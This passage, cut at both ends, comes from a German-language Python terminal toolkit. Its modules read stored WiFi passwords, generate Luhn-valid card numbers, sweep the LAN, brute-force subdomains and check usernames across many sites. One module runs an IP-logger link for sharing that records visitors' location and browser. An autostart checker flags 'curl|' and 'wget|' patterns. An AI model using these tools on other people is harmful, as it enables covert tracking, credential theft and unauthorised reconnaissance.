                pw   = lines[i+1].strip() if i+1 < len(lines) else "—"
                if ssid:
                    pairs.append((ssid, pw or "—"))
        except Exception:
            pass

        # Methode 2: /etc/NetworkManager/system-connections/ (root nötig)
        if not pairs:
            nm_dir = "/etc/NetworkManager/system-connections"
            if os.path.isdir(nm_dir):
                for fn in os.listdir(nm_dir):
                    fp = os.path.join(nm_dir, fn)
                    try:
                        txt = open(fp, errors="ignore").read()
                        ssid_m = re.search(r"ssid=(.+)", txt)
                        pw_m   = re.search(r"psk=(.+)", txt)
                        if ssid_m:
                            pairs.append((ssid_m.group(1).strip(),
                                          pw_m.group(1).strip() if pw_m else "—"))
                    except Exception:
                        pass

        # Methode 3: Android /data/misc/wifi/ (root nötig)
        if not pairs:
            for wf in ("/data/misc/wifi/WifiConfigStore.xml",
                       "/data/misc/wifi/wpa_supplicant.conf"):
                if not os.path.exists(wf):
                    continue
                try:
                    txt = open(wf, errors="ignore").read()
                    nets = re.findall(
                        r'ssid="([^"]+)".*?(?:psk|PreSharedKey)="([^"]*)"',
                        txt, re.DOTALL)
                    for ssid, pw in nets:
                        pairs.append((ssid, pw or "—"))
                except Exception:
                    pass

        print(f"\n  {DG}╔{'═'*W}╗{R}")
        h1 = _pad(f"  {YG}{'NETZWERK':<30}{R}", 34)
        h2 = _pad(f"  {YG}{'PASSWORT':<30}{R}", 34)
        print(f"  {DG}║{R}{h1}{h2}{DG}║{R}")
        print(f"  {DG}╠{'═'*W}╣{R}")

        if not pairs:
            lines_msg = [
                "Keine WLAN-Passwörter gefunden.",
                "Android: Root + Termux-Root-Access nötig.",
                "  → su -c 'cat /data/misc/wifi/WifiConfigStore.xml'",
                "Linux Desktop: nmcli oder sudo Zugriff nötig.",
            ]
            for lm in lines_msg:
                print(f"  {DG}║{R}{_pad(f'  {DIM}{lm}{R}', W)}{DG}║{R}")
        else:
            for ssid, pw in pairs:
                name_col = _pad(f"  {G}{ssid[:28]}{R}", 34)
                pw_col   = _pad(f"  {YG if pw != '—' else DIM}{pw[:28]}{R}", 34)
                print(f"  {DG}║{R}{name_col}{pw_col}{DG}║{R}")

        print(f"  {DG}╠{'═'*W}╣{R}")
        summary = _pad(f"  {DIM}{len(pairs)} Netzwerke gefunden{R}", W)
        print(f"  {DG}║{R}{summary}{DG}║{R}")
        print(f"  {DG}╚{'═'*W}╝{R}\n")
        input(f"  {DG}[ENTER]{R} ")

def process_monitor():
    hdr("PROZESS MONITOR")
    _spinner("Lade laufende Prozesse...", 1.0)
    W = 68

    if os.name == "nt":
        try:
            out = subprocess.check_output(
                ["powershell", "-NoProfile", "-Command",
                 "Get-Process | Sort-Object CPU -Descending | Select-Object -First 20 | "
                 "Format-Table -AutoSize Id,CPU,WorkingSet,Name | Out-String -Width 120"],
                stderr=subprocess.DEVNULL
            ).decode("utf-8", errors="ignore")
        except Exception as e:
            print(f"  {R}Fehler: {e}"); input(f"\n  {DG}[ENTER]{R} "); return
    else:
        # Linux / Android: ps oder /proc
        out = ""
        try:
            out = subprocess.check_output(
                ["ps", "-eo", "pid,pcpu,rss,comm", "--sort=-pcpu"],
                stderr=subprocess.DEVNULL
            ).decode(errors="ignore")
            lines = out.splitlines()
            out = "\n".join(lines[:21])   # header + 20 procs
        except Exception:
            # Fallback: /proc lesen
            try:
                procs = []
                for pid in os.listdir("/proc"):
                    if not pid.isdigit(): continue
                    try:
                        comm = open(f"/proc/{pid}/comm").read().strip()
                        stat = open(f"/proc/{pid}/stat").read().split()
                        rss  = int(open(f"/proc/{pid}/status").read().split("VmRSS:")[1].split()[0]) if "VmRSS:" in open(f"/proc/{pid}/status").read() else 0
                        procs.append((int(pid), comm, rss))
                    except Exception:
                        pass
                procs.sort(key=lambda x: x[2], reverse=True)
                header = f"{'PID':>7}  {'RSS(kB)':>10}  NAME"
                out = header + "\n" + "\n".join(
                    f"{p:>7}  {r:>10}  {n}" for p, n, r in procs[:20]
                )
            except Exception as e:
                print(f"  {R}Fehler: {e}"); input(f"\n  {DG}[ENTER]{R} "); return

    print(f"\n  {DG}╔{'═'*W}╗{R}")
    title = _pad(f"  {YG}TOP 20 PROZESSE  (nach CPU-Nutzung){R}", W)
    print(f"  {DG}║{R}{title}{DG}║{R}")
    print(f"  {DG}╠{'═'*W}╣{R}")
    for line in out.splitlines():
        if not line.strip(): continue
        inner = _pad(f"  {DIM}{line[:66]}{R}", W)
        print(f"  {DG}║{R}{inner}{DG}║{R}")
    print(f"  {DG}╚{'═'*W}╝{R}\n")
    input(f"  {DG}[ENTER]{R} ")

def autostart_manager():
    hdr("AUTOSTART MANAGER")
    _spinner("Lese Autostart-Einträge...", 1.2)
    W = 68
    entries = []

    if os.name == "nt":
        regs = [
            r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run",
            r"HKLM\Software\Microsoft\Windows\CurrentVersion\Run",
        ]
        for reg in regs:
            try:
                out = subprocess.check_output(
                    ["reg", "query", reg], stderr=subprocess.DEVNULL
                ).decode("utf-8", errors="ignore")
                for line in out.splitlines():
                    line = line.strip()
                    if "REG_SZ" in line or "REG_EXPAND_SZ" in line:
                        parts = re.split(r'\s{2,}', line)
                        if len(parts) >= 3:
                            entries.append((parts[0].strip(), parts[-1].strip()))
            except Exception:
                pass
    else:
        # Linux / Android: systemd user-services + XDG autostart + crontab
        for autostart_dir in (
            os.path.expanduser("~/.config/autostart"),
            "/etc/xdg/autostart",
        ):
            if os.path.isdir(autostart_dir):
                for fn in os.listdir(autostart_dir):
                    if not fn.endswith(".desktop"): continue
                    fp = os.path.join(autostart_dir, fn)
                    try:
                        txt = open(fp, errors="ignore").read()
                        name_m = re.search(r"^Name=(.+)", txt, re.M)
                        exec_m = re.search(r"^Exec=(.+)", txt, re.M)
                        if exec_m:
                            entries.append((
                                name_m.group(1).strip() if name_m else fn,
                                exec_m.group(1).strip()
                            ))
                    except Exception:
                        pass
        # systemd --user services
        try:
            svc_dir = os.path.expanduser("~/.config/systemd/user")
            if os.path.isdir(svc_dir):
                for fn in os.listdir(svc_dir):
                    if not fn.endswith(".service"): continue
                    fp = os.path.join(svc_dir, fn)
                    try:
                        txt = open(fp, errors="ignore").read()
                        exec_m = re.search(r"^ExecStart=(.+)", txt, re.M)
                        entries.append((fn, exec_m.group(1).strip() if exec_m else fp))
                    except Exception:
                        pass
        except Exception:
            pass
        # crontab @reboot lines
        try:
            ct = subprocess.check_output(
                ["crontab", "-l"], stderr=subprocess.DEVNULL
            ).decode(errors="ignore")
            for line in ct.splitlines():
                if line.startswith("@reboot"):
                    entries.append(("cron @reboot", line[7:].strip()))
        except Exception:
            pass

    print(f"\n  {DG}╔{'═'*W}╗{R}")
    h1 = _pad(f"  {YG}{'NAME':<20}{R}", 24)
    h2 = _pad(f"  {YG}{'PFAD':<42}{R}", 44)
    print(f"  {DG}║{R}{h1}{h2}{DG}║{R}")
    print(f"  {DG}╠{'═'*W}╣{R}")
    if not entries:
        print(f"  {DG}║{R}{_pad(f'  {DIM}Keine Einträge gefunden{R}', W)}{DG}║{R}")
    for name, path in entries:
        # Suspicious check
        sus_win = os.name == "nt" and any(kw in path.lower() for kw in ["temp","appdata\\local\\temp","roaming\\microsoft\\windows\\start"])
        sus_lnx = os.name != "nt" and any(kw in path.lower() for kw in ["/tmp/","/dev/shm/","base64","curl|","wget|"])
        sus = sus_win or sus_lnx
        col = "\033[1;91m" if sus else G
        n_col = _pad(f"  {col}{name[:18]}{R}", 24)
        p_col = _pad(f"  {DIM}{path[:42]}{R}", 44)
        print(f"  {DG}║{R}{n_col}{p_col}{DG}║{R}")
    print(f"  {DG}╠{'═'*W}╣{R}")
    warn = _pad(f"  {DIM}Rot markierte Einträge: verdächtig{R}", W)
    print(f"  {DG}║{R}{warn}{DG}║{R}")
    print(f"  {DG}╚{'═'*W}╝{R}\n")
    input(f"  {DG}[ENTER]{R} ")

def fake_creditcard():
    RED = "[91m"; BRED = "[1;91m"
    import random
    hdr("FAKE CREDIT CARD GENERATOR")
    print(f"  {DIM}Generiert valide Testkartennummern (Luhn-Algorithmus) — nur für Tests!{R}\n")

    BINS = {
        "Visa":       [("4539", 16), ("4916", 16), ("4532", 16)],
        "Mastercard": [("5425", 16), ("5111", 16), ("2221", 16)],
        "Amex":       [("3714", 15), ("3782", 15)],
        "Discover":   [("6011", 16), ("6500", 16)],
    }

    def luhn_complete(partial):
        while len(partial) < partial_len - 1:
            partial.append(random.randint(0, 9))
        # Luhn check digit
        total = 0
        rev = partial[::-1]
        for i, d in enumerate(rev):
            if i % 2 == 0:
                total += d
            else:
                doubled = d * 2
                total += doubled - 9 if doubled > 9 else doubled
        check = (10 - total % 10) % 10
        return partial + [check]

    W = 68
    print(f"  {DG}╔{'═'*W}╗{R}")
    print(f"  {DG}║{R}  {YG}⬡  GENERATED TEST CARDS{DG}{' '*(W-24)}║{R}")
    print(f"  {DG}╠{'═'*W}╣{R}")

    for brand, bins in BINS.items():
        prefix_str, partial_len = random.choice(bins)
        prefix = [int(c) for c in prefix_str]
        digits = luhn_complete(prefix)
        num = " ".join(
            "".join(str(d) for d in digits[i:i+4])
            for i in range(0, len(digits), 4)
        )
        month = random.randint(1, 12)
        year  = random.randint(26, 30)
        cvv   = "".join([str(random.randint(0,9)) for _ in range(4 if brand=="Amex" else 3)])
        name  = random.choice(["MAX MUSTERMANN","JOHN DOE","ANNA SMITH","LEON MUELLER"])

        inner = f"  {DG}{brand:<12}{R} {YG}{num:<22}{R} {DIM}{month:02d}/{year}  CVV:{cvv}  {name}{R}"
        print(f"  {DG}║{R}{_pad(inner, W)}{DG}║{R}")

    print(f"  {DG}╚{'═'*W}╝{R}\n")
    print(f"  {DIM}Diese Nummern sind mathematisch valide aber NICHT real — kein Betrug möglich.{R}\n")
    input(f"  {DG}[ENTER]{R} ")

def morse_code():
    hdr("MORSE CODE")
    MORSE = {
        'A':'.-','B':'-...','C':'-.-.','D':'-..','E':'.','F':'..-.','G':'--.','H':'....',
        'I':'..','J':'.---','K':'-.-','L':'.-..','M':'--','N':'-.','O':'---','P':'.--.','Q':'--.-',
        'R':'.-.','S':'...','T':'-','U':'..-','V':'...-','W':'.--','X':'-..-','Y':'-.--','Z':'--..',
        '0':'-----','1':'.----','2':'..---','3':'...--','4':'....-','5':'.....','6':'-....','7':'--...',
        '8':'---..','9':'----.',' ':'/',
    }
    REV = {v: k for k, v in MORSE.items()}

    W = 68
    print(f"  {DG}╔{'═'*W}╗{R}")
    print(f"  {DG}║{R}  {YG}⬡  MORSE CODE CONVERTER{DG}{' '*(W-25)}║{R}")
    print(f"  {DG}╠{'═'*W}╣{R}")
    m1 = f"  {DG}[ 1 ]{R} {G}Text → Morse{R}"
    m2 = f"  {DG}[ 2 ]{R} {G}Morse → Text{R}"
    print(f"  {DG}║{R}{_pad(m1, 34)}{_pad(m2, 34)}{DG}║{R}")
    print(f"  {DG}╚{'═'*W}╝{R}\n")

    mode = input(f"  {DG}╘══[{G}MODUS{DG}]══►{R} ").strip()

    if mode == "1":
        text = input(f"  {DG}╘══[{G}TEXT{DG}]══►{R} ").strip().upper()
        _spinner("Kodiere...", 0.8)
        result = "  ".join(MORSE.get(c, "?") for c in text)
        print(f"\n  {DG}╔{'═'*W}╗{R}")
        print(f"  {DG}║{R}  {DIM}MORSE:{R}")
        # Zeilenumbruch bei langen Ergebnissen
        chunk = 64
        for i in range(0, len(result), chunk):
            inner = f"  {G}{result[i:i+chunk]}{R}"
            print(f"  {DG}║{R}{_pad(inner, W)}{DG}║{R}")
        print(f"  {DG}╚{'═'*W}╝{R}\n")
    elif mode == "2":
        morse = input(f"  {DG}╘══[{G}MORSE (Leerzeichen zwischen Zeichen, / zwischen Wörtern){DG}]══►{R} ").strip()
        _spinner("Dekodiere...", 0.8)
        words = morse.split(" / ")
        decoded = " ".join("".join(REV.get(c,"?") for c in w.split()) for w in words)
        print(f"\n  {DG}╔{'═'*W}╗{R}")
        inner = f"  {G}{decoded}{R}"
        print(f"  {DG}║{R}{_pad(inner, W)}{DG}║{R}")
        print(f"  {DG}╚{'═'*W}╝{R}\n")

    input(f"  {DG}[ENTER]{R} ")

def ascii_art_gen():
    hdr("ASCII ART GENERATOR")
    FONTS = {
        "block": {
            "A":"  /\\ \n /  \\\n/----\\\n","B":"|\\ \n| >\n|/ ",
        }
    }
    # Einfache Block-Lettern 5x5 per Zeichen
    LETTERS = {
        'A': ["  █  ","█   █","█████","█   █","█   █"],
        'B': ["████ ","█   █","████ ","█   █","████ "],
        'C': [" ████","█    ","█    ","█    "," ████"],
        'D': ["████ ","█   █","█   █","█   █","████ "],
        'E': ["█████","█    ","███  ","█    ","█████"],
        'F': ["█████","█    ","███  ","█    ","█    "],
        'G': [" ████","█    ","█  ██","█   █"," ████"],
        'H': ["█   █","█   █","█████","█   █","█   █"],
        'I': ["█████","  █  ","  █  ","  █  ","█████"],
        'J': ["█████","   █ ","   █ ","█  █ "," ██  "],
        'K': ["█   █","█  █ ","███  ","█  █ ","█   █"],
        'L': ["█    ","█    ","█    ","█    ","█████"],
        'M': ["█   █","██ ██","█ █ █","█   █","█   █"],
        'N': ["█   █","██  █","█ █ █","█  ██","█   █"],
        'O': [" ███ ","█   █","█   █","█   █"," ███ "],
        'P': ["████ ","█   █","████ ","█    ","█    "],
        'Q': [" ███ ","█   █","█ █ █","█  ██"," ████"],
        'R': ["████ ","█   █","████ ","█  █ ","█   █"],
        'S': [" ████","█    "," ███ ","    █","████ "],
        'T': ["█████","  █  ","  █  ","  █  ","  █  "],
        'U': ["█   █","█   █","█   █","█   █"," ███ "],
        'V': ["█   █","█   █","█   █"," █ █ ","  █  "],
        'W': ["█   █","█   █","█ █ █","██ ██","█   █"],
        'X': ["█   █"," █ █ ","  █  "," █ █ ","█   █"],
        'Y': ["█   █"," █ █ ","  █  ","  █  ","  █  "],
        'Z': ["█████","   █ ","  █  "," █   ","█████"],
        '0': [" ███ ","█  ██","█ █ █","██  █"," ███ "],
        '1': ["  █  "," ██  ","  █  ","  █  ","█████"],
        '2': [" ███ ","    █"," ███ ","█    ","█████"],
        '3': ["████ ","    █"," ███ ","    █","████ "],
        '!': ["  █  ","  █  ","  █  ","     ","  █  "],
        '?': [" ███ ","    █","  ██ ","     ","  █  "],
        ' ': ["     ","     ","     ","     ","     "],
    }

    text = input(f"  {DG}╘══[{G}TEXT (max 10 Zeichen){DG}]══►{R} ").strip().upper()[:10]
    color = input(f"  {DG}╘══[{G}Farbe: 1=Grün  2=Cyan  3=Gelb  4=Weiß{DG}]══►{R} ").strip()
    col_map = {"1": G, "2": "\033[96m", "3": "\033[93m", "4": "\033[97m"}
    fc = col_map.get(color, G)

    _spinner("Rendere ASCII Art...", 1.0)
    clear()
    hdr("ASCII ART GENERATOR")

    lines = ["", "", "", "", ""]
    for ch in text:
        glyph = LETTERS.get(ch, LETTERS[' '])
        for i in range(5):
            lines[i] += glyph[i] + " "

    print()
    W = max(len(l) for l in lines) + 4
    print(f"  {DG}╔{'═'*max(W,40)}╗{R}")
    for l in lines:
        print(f"  {DG}║{R}  {fc}{l}{R}")
    print(f"  {DG}╚{'═'*max(W,40)}╝{R}\n")
    input(f"  {DG}[ENTER]{R} ")

def lan_map():
    import subprocess, socket, concurrent.futures
    hdr("NETZWERK-KARTE")
    _spinner("Scanne lokales Netzwerk...", 1.5)

    try:
        local_ip = socket.gethostbyname(socket.gethostname())
    except Exception:
        local_ip = "192.168.1.100"
    prefix = ".".join(local_ip.split(".")[:3])

    found = []
    def ping_host(i):
        ip = f"{prefix}.{i}"
        try:
            out = subprocess.check_output(
                ["ping", "-n", "1", "-w", "300", ip],
                stderr=subprocess.DEVNULL, timeout=1
            ).decode(errors="ignore")
            if "TTL=" in out or "ttl=" in out:
                try:
                    name = socket.gethostbyaddr(ip)[0]
                except Exception:
                    name = "?"
                return (ip, name)
        except Exception:
            pass
        return None

    _progress_bar("Scanne 192.168.x.1-254", steps=20, delay=0.05)

    with concurrent.futures.ThreadPoolExecutor(max_workers=80) as ex:
        results = ex.map(ping_host, range(1, 255))
    found = [r for r in results if r]
    found.sort(key=lambda x: int(x[0].split(".")[-1]))

    W = 68
    clear()
    hdr("NETZWERK-KARTE")
    print(f"  {DG}╔{'═'*W}╗{R}")
    print(f"  {DG}║{R}  {YG}⬡  LAN MAP  ·  {DG}Subnetz: {G}{prefix}.0/24{DG}{' '*(W-33-len(prefix))}║{R}")
    print(f"  {DG}╠{'═'*W}╣{R}")
    print(f"  {DG}║{R}  {YG}[ROUTER]{R}  {DG}──{R}  {G}{prefix}.1{DG}{' '*(W-20-len(prefix))}║{R}")
    print(f"  {DG}║{R}  {DG}   │{' '*(W-4)}║{R}")

    if not found:
        inner = f"  {DIM}Keine Geräte gefunden (Admin-Rechte nötig?){R}"
        print(f"  {DG}║{R}{_pad(inner, W)}{DG}║{R}")
    else:
        for ip, name in found:
            tag = "★ DU " if ip == local_ip else "    "
            host = name[:30] if name != "?" else ""
            inner = f"  {DG}├──{R} {G}{tag}{R}{YG}{ip:<16}{R} {DIM}{host}{R}"
            print(f"  {DG}║{R}{_pad(inner, W)}{DG}║{R}")

    print(f"  {DG}╠{'═'*W}╣{R}")
    count_line = f"  {G}{len(found)} Gerät(e) online{R}"
    print(f"  {DG}║{R}{_pad(count_line, W)}{DG}║{R}")
    print(f"  {DG}╚{'═'*W}╝{R}\n")
    input(f"  {DG}[ENTER]{R} ")

def local_ip_logger():
    import threading, http.server, urllib.parse
    hdr("IP LOGGER SERVER")
    print(f"  {DG}Startet einen lokalen HTTP-Server der alle Besucher loggt.{R}")
    print(f"  {DG}Teile den Link — wer draufklickt wird mit IP gespeichert.{R}")
    print(f"  {YG}⚠  Nur für Tests mit eigenem Server / mit Erlaubnis nutzen!{R}\n")

    # Eigene lokale IP
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8",80)); local_ip = s.getsockname()[0]; s.close()
    except: local_ip = "127.0.0.1"

    try:
        port = int(input(f"  {G}>{R} Port [Standard: 8080]: ").strip() or "8080")
    except: port = 8080

    redirect = input(f"  {G}>{R} Weiterleitung nach Klick [leer = leere Seite]: ").strip()
    if redirect and not redirect.startswith("http"): redirect = "https://" + redirect

    logs = []
    log_lock = threading.Lock()

    # Öffentliche IP holen
    try:
        pub_ip = getj("https://api.ipify.org?format=json").get("ip","DEINE-IP")
    except: pub_ip = local_ip

    class LogHandler(http.server.BaseHTTPRequestHandler):
        def do_GET(self):
            visitor_ip   = self.client_address[0]
            visitor_time = datetime.now().strftime("%H:%M:%S")
            ua           = self.headers.get("User-Agent","?")
            ref          = self.headers.get("Referer","?")
            path         = self.path

            # Geo-Lookup
            try:
                geo = getj(f"http://ip-api.com/json/{visitor_ip}?fields=country,city,isp,proxy,vpn")
            except: geo = {}

            entry = {
                "time":    visitor_time,
                "ip":      visitor_ip,
                "country": geo.get("country","?"),
                "city":    geo.get("city","?"),
                "isp":     geo.get("isp","?"),
                "vpn":     geo.get("vpn") or geo.get("proxy"),
                "ua":      ua[:80],
                "ref":     ref,
                "path":    path,
            }
            with log_lock:
                logs.append(entry)

            # Antwort senden
            if redirect:
                self.send_response(302)
                self.send_header("Location", redirect)
                self.end_headers()
            else:
                html = b"<html><body style='background:#000;color:#0f0;font-family:monospace'><h2>OK</h2></body></html>"
                self.send_response(200)
                self.send_header("Content-Type","text/html")
                self.send_header("Content-Length", str(len(html)))
                self.end_headers()
                self.wfile.write(html)

            # Terminal-Log live ausgeben
            vpn_tag = f"  {YG}[VPN/PROXY]{R}" if entry["vpn"] else ""
            print(f"\n  {DG}╔{'═'*62}╗{R}")
            print(f"  {DG}║{R}  {YG}⬡ NEUER BESUCHER  {DG}{visitor_time}{' '*30}{DG}║{R}")
            print(f"  {DG}╠{'═'*62}╣{R}")
            print(f"  {DG}║{R}  {DG}IP         {R}{G}{visitor_ip:<20}{R}{vpn_tag}{' '*(30-len(visitor_ip))}{DG}║{R}")
            print(f"  {DG}║{R}  {DG}Land       {R}{G}{entry['country']}, {entry['city']}{R}{' '*max(0,38-len(entry['country'])-len(entry['city']))}{DG}║{R}")
            print(f"  {DG}║{R}  {DG}ISP        {R}{G}{entry['isp'][:48]}{R}{' '*max(0,48-len(entry['isp']))}{DG}║{R}")
            print(f"  {DG}║{R}  {DG}Browser    {R}{G}{ua[:48]}{R}{' '*max(0,48-len(ua[:48]))}{DG}║{R}")
            print(f"  {DG}╚{'═'*62}╝{R}")

        def log_message(self, fmt, *args): pass  # kein Standard-Log

    server = http.server.HTTPServer(("0.0.0.0", port), LogHandler)
    srv_thread = threading.Thread(target=server.serve_forever, daemon=True)
    srv_thread.start()

    div()
    W = 62
    print(f"  {DG}╔{'═'*W}╗{R}")
    print(f"  {DG}║{R}  {YG}⬡ IP LOGGER AKTIV{DG}{'─'*(W-18)}║{R}")
    print(f"  {DG}╠{'═'*W}╣{R}")
    print(f"  {DG}║{R}  {DG}Lokaler Link  {R}{G}http://{local_ip}:{port}{R}{' '*max(0,W-16-len(local_ip)-len(str(port)))}{DG}║{R}")
    print(f"  {DG}║{R}  {DG}Externer Link {R}{YG}http://{pub_ip}:{port}{R}{' '*max(0,W-16-len(pub_ip)-len(str(port)))}{DG}║{R}")
    if redirect:
        print(f"  {DG}║{R}  {DG}Weiterleitung {R}{G}{redirect[:48]}{R}{' '*max(0,W-15-len(redirect[:48]))}{DG}║{R}")
    print(f"  {DG}╠{'═'*W}╣{R}")
    print(f"  {DG}║{R}  {G}Warte auf Besucher ...  STRG+C oder ENTER zum Stoppen{R}{'  '}{DG}║{R}")
    print(f"  {DG}╚{'═'*W}╝{R}\n")
    print(f"  {DG}Tipp: Teile den externen Link — Port {port} muss in deinem Router{R}")
    print(f"  {DG}      weitergeleitet sein damit externe Besucher ankommen.{R}\n")

    try:
        input()
    except KeyboardInterrupt:
        pass
    finally:
        server.shutdown()

    # Zusammenfassung
    div()
    print(f"  {DG}Server gestoppt.{R}  {G}{len(logs)} Besucher geloggt.{R}\n")
    if logs:
        W2 = 62
        print(f"  {DG}╔{'═'*W2}╗{R}")
        print(f"  {DG}║{R}  {YG}GESAMT-LOG ({len(logs)} Einträge){DG}{'─'*(W2-18-len(str(len(logs))))  }║{R}")
        print(f"  {DG}╠{'═'*W2}╣{R}")
        for i, e in enumerate(logs, 1):
            vpn = f"{YG}[VPN]{R}" if e["vpn"] else "     "
            print(f"  {DG}║{R}  {DG}{i:>2}.{R} {G}{e['ip']:<18}{R} {DG}{e['time']}{R} {vpn} {G}{e['country']}, {e['city']}{R}")
            print(f"  {DG}║{R}      {DG}ISP: {R}{G}{e['isp'][:52]}{R}")
        print(f"  {DG}╚{'═'*W2}╝{R}")

    wait()


# ── 60  USERNAME CHECKER ─────────────────────────────────────
def username_checker():
    hdr("USERNAME CHECKER")
    uname = inp("Username")
    if not uname:
        wait(); return
    sites = [
        {"name":"GitHub",       "url":"https://github.com/{}"},
        {"name":"Reddit",       "url":"https://www.reddit.com/user/{}"},
        {"name":"TikTok",       "url":"https://www.tiktok.com/@{}"},
        {"name":"Twitch",       "url":"https://www.twitch.tv/{}"},
        {"name":"Pinterest",    "url":"https://www.pinterest.com/{}/"},
        {"name":"SoundCloud",   "url":"https://soundcloud.com/{}"},
        {"name":"Steam",        "url":"https://steamcommunity.com/id/{}"},
        {"name":"GitLab",       "url":"https://gitlab.com/{}"},
        {"name":"Medium",       "url":"https://medium.com/@{}"},
        {"name":"DevTo",        "url":"https://dev.to/{}"},
        {"name":"Keybase",      "url":"https://keybase.io/{}"},
        {"name":"Pastebin",     "url":"https://pastebin.com/u/{}"},
        {"name":"Replit",       "url":"https://replit.com/@{}"},
        {"name":"Vimeo",        "url":"https://vimeo.com/{}"},
        {"name":"Flickr",       "url":"https://www.flickr.com/people/{}"},
        {"name":"Behance",      "url":"https://www.behance.net/{}"},
        {"name":"Dribbble",     "url":"https://dribbble.com/{}"},
        {"name":"Fiverr",       "url":"https://www.fiverr.com/{}"},
        {"name":"Gravatar",     "url":"https://en.gravatar.com/{}"},
        {"name":"About.me",     "url":"https://about.me/{}"},
        {"name":"Linktree",     "url":"https://linktr.ee/{}"},
        {"name":"Etsy",         "url":"https://www.etsy.com/shop/{}"},
        {"name":"eBay",         "url":"https://www.ebay.com/usr/{}"},
        {"name":"Trello",       "url":"https://trello.com/{}"},
        {"name":"HackerNews",   "url":"https://news.ycombinator.com/user?id={}"},
        {"name":"Codecademy",   "url":"https://www.codecademy.com/profiles/{}"},
        {"name":"ProductHunt",  "url":"https://www.producthunt.com/@{}"},
        {"name":"Dailymotion",  "url":"https://www.dailymotion.com/{}"},
        {"name":"Venmo",        "url":"https://venmo.com/{}"},
        {"name":"Freelancer",   "url":"https://www.freelancer.com/u/{}"},
    ]
    div()
    print(f"  {DG}Suche '{uname}' auf {len(sites)} Plattformen ...{R}\n")
    found = []
    lock  = threading.Lock()
    sem   = threading.Semaphore(15)
    def _chk(site):
        with sem:
            url = site["url"].format(uname)
            try:
                req = urllib.request.Request(url, method="HEAD",
                      headers={"User-Agent":"Mozilla/5.0"})
                with urllib.request.urlopen(req, timeout=8) as r:
                    if r.status < 400:
                        with lock:
                            found.append((site["name"], url))
                            print(f"  {G}[+] {site['name']:<18} {url}{R}")
            except urllib.error.HTTPError as e:
                if e.code not in (404, 410):
                    with lock:
                        found.append((site["name"], url))
                        print(f"  {YG}[?] {site['name']:<18} HTTP {e.code}{R}")
            except: pass
    thds = [threading.Thread(target=_chk, args=(s,), daemon=True) for s in sites]
    for t in thds: t.start()
    for t in thds: t.join()
    div()
    print(f"  {YG}{len(found)} Treffer gefunden.{R}")
    wait()

# ── 61  IP REPUTATION CHECK ──────────────────────────────────
def ip_reputation():
    hdr("IP REPUTATION CHECK")
    ip_in = inp("IP-Adresse prüfen").strip()
    if not ip_in:
        wait(); return
    parts = ip_in.split(".")
    if len(parts) != 4:
        print(f"  {G}[!] Ungültige IPv4-Adresse{R}"); wait(); return
    rev_ip = ".".join(reversed(parts))
    dnsbls = [
        "zen.spamhaus.org","bl.spamcop.net","dnsbl.sorbs.net",
        "b.barracudacentral.org","dnsbl-1.uceprotect.net",
        "dnsbl-2.uceprotect.net","pbl.spamhaus.org","sbl.spamhaus.org",
        "xbl.spamhaus.org","cbl.abuseat.org","psbl.surriel.com",
        "db.wpbl.info","ix.dnsbl.manitu.net","spam.dnsbl.anonmails.de",
        "dnsbl-3.uceprotect.net",
    ]
    div()
    print(f"  {DG}Prüfe {ip_in} gegen {len(dnsbls)} Blacklists ...{R}\n")
    listed = []
    lock = threading.Lock()
    sem  = threading.Semaphore(10)
    def _chkbl(bl):
        with sem:
            try:
                socket.gethostbyname(f"{rev_ip}.{bl}")
                with lock:
                    listed.append(bl)
                    print(f"  {G}[!] GELISTET: {bl}{R}")
            except: pass
    thds = [threading.Thread(target=_chkbl, args=(bl,), daemon=True) for bl in dnsbls]
    for t in thds: t.start()
    for t in thds: t.join()
    div()
    if listed:
        print(f"  {G}[!] {ip_in} ist auf {len(listed)} Blacklist(s) gelistet!{R}")
    else:
        print(f"  {G}[✓] {ip_in} ist auf keiner bekannten Blacklist.{R}")
    wait()

# ── 62  SUBDOMAIN BRUTE-FORCE ─────────────────────────────────
def subdomain_bruteforce():
    hdr("SUBDOMAIN BRUTE-FORCE")
    t    = inp("Domain (z.B. example.com)")
    host = re.sub(r"https?://","",t).split("/")[0].strip()
    if not host: wait(); return
    wordlist = [
        "www","mail","ftp","smtp","pop","imap","webmail","admin","portal","api",
        "dev","staging","test","shop","blog","forum","support","help","docs",
        "cdn","static","assets","media","img","vpn","remote","ns1","ns2","mx",
        "m","mobile","app","login","auth","sso","beta","old","secure","panel",
        "cpanel","dashboard","status","git","gitlab","ci","cloud","video","pay",
        "store","news","search","upload","download","files","data","db","database",
        "mysql","pg","postgres","redis","mongo","elasticsearch","kibana","grafana",
        "jenkins","jira","confluence","wiki","kb","crm","erp","accounting","finance",
        "marketing","sales","engineering","ops","infra","prod","production","qa","uat",
        "demo","preview","sandbox","lab","cdn1","cdn2","s3","bucket","storage","backup",
        "smtp1","smtp2","relay","mx1","mx2","mta","bounce","autodiscover","autoconfig",
        "exchange","owa","lync","meet","sip","vpn1","vpn2","proxy","gw","gateway",
        "edge","lb","web","web1","web2","app1","app2","api1","api2","v1","v2","v3",
        "internal","intranet","partner","client","account","billing","invoice","order",
        "cart","checkout","payment","track","monitoring","log","logs","metrics","stats",
        "analytics","report","bi","corp","ir","press","careers","jobs","hr","legal",
        "privacy","compliance","security","abuse","noc","health","ping","uptime",
        "local","dmz","mgmt","management","superadmin","root","sys","test2","dev2",
        "staging2","preview2","canary","release","rc","alpha","image","images","photo",
        "photos","stream","live","broadcast","rss","feed","community","social","chat",
        "mail2","mail3","webmail2","roundcube","smtp3","pop3","imap2","inbound",
        "id","identity","idp","saml","oauth","oidc","ldap","ad","pki","certs",
        "ntp","dns","dns1","dns2","resolver","syslog","snmp","nagios","zabbix",
        "prometheus","grafana2","elastic","kibana2","logstash","splunk","puppet",
        "ansible","k8s","docker","registry","repo","artifact","nexus","build",
        "deploy","pipeline","ticket","helpdesk","servicedesk","support2","survey",
        "form","forms","poll","feedback","review","map","maps","gps","short","link",
    ]
    div()
    print(f"  {DG}Brute-Force: {len(wordlist)} Subdomains für {host} ...{R}\n")
    found = []
    lock = threading.Lock()
    sem  = threading.Semaphore(30)
    def _probe(sub):
        with sem:
            fqdn = f"{sub}.{host}"
            try:
                ip2 = socket.gethostbyname(fqdn)
                with lock:
                    found.append(fqdn)
                    print(f"  {G}[+] {fqdn:<50} → {ip2}{R}")
            except: pass
    thds = [threading.Thread(target=_probe, args=(s2,), daemon=True) for s2 in wordlist]
    for t in thds: t.start()
    for t in thds: t.join()
    div()
